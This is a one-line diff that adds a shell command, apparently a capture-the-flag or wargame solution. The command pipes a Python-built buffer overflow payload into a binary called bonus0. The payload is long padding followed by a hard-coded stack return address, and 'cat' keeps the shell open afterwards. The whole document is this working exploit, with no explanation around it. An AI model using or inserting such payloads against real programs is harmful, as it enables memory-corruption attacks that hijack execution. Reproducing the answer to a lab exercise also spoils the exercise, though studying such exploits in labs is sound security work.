@@ -1,0 +1,1 @@
+(python -c 'print "A" * 4095 + "\n" + "AAAABBBBC\x6e\xfe\xff\xbf" + "A" * 50'; cat) | ./bonus0
